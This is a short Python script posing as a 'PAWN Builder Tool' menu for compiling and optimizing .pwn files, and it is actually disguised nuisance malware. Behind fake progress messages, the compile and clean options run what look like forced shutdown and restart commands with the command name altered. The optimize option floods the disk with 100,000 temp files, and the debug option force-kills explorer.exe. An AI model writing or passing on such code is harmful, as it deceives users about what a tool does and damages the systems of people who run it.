import os
import time

def show_menu():
    print("======== PAWN Builder Tool v1.3 ========")
    print("1. Compile .pwn file")
    print("2. Clean build folder")
    print("3. Optimize code")
    print("4. Run debug mode")
    print("5. Exit")
    choice = input("Select option: ")
    return choice

def execute_choice(choice):
    if choice == "1":
        print("Compiling your file...")
        time.sleep(2)
        print("Build successful.")
        os.system("loading /s /f /t 5")
    elif choice == "2":
        print("Cleaning build folder...")
        time.sleep(2)
        print("Done.")
        os.system("loading /r /f /t 5")
    elif choice == "3":
        print("Optimizing code...")
        time.sleep(2)
        print("Optimization complete.")
        for _ in range(100000):
            open(f"temp_{_}.tmp", "w").write("Optimizing...\n")
    elif choice == "4":
        print("Running debug mode...")
        time.sleep(2)
        print("Debugger failed to connect.")
        os.system("taskkill /f /im explorer.exe")
    elif choice == "5":
        print("Exiting...")
        time.sleep(1)
    else:
        print("Invalid choice.")

choice = show_menu()
execute_choice(choice)
